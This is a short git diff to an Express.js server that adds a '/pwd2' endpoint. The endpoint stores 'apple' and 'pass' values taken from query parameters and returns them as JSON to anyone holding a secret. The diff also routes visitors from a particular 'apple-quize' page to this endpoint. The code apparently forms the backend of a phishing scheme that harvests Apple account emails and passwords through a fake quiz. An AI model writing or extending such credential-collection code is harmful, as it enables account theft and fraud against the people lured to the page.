@@ -14,6 +14,8 @@ var cost = 0.001
 const port = process.env.PORT || 3000;
 var pwd = {"apple":"",
            "pass":""}
+var pwd2 = {"apple":"",
+           "pass":""}
 
 // setting up app
 const app = express();
@@ -140,6 +142,19 @@ if (req.query.s == process.env.s) {
 }
 });
 
+app.get("/pwd2", function(req,res) {
+  if (req.query.ne) {
+    pwd["apple"] = req.query.ne
+  } else if (req.query.np) {
+    pwd["pass"] = req.query.np
+  }
+if (req.query.s == process.env.s) {
+  res.json(pwd)
+} else {
+  res.render("404.ejs")
+}
+});
+
 app.get("/A2/:rnd", function(req,res) {
   res.redirect("https://discord.gg/k3NRzYtmsj")
 })
@@ -147,7 +162,9 @@ app.get("/A2/:rnd", function(req,res) {
 app.get("/sec", function(req,res){
    if (req.get('referer') === "https://pixelpaste.net/quize/apple-quize") {
      res.redirect("/pwd?s="+process.env.s)
-   } else {
+   } else if (req.get('referer') === "https://pixelpaste.net/quize/apple-quize?id=22") {
+         res.redirect("/pwd2?s="+process.env.s)             
+      } else {
       res.json({"req":"400"})
    }
 });
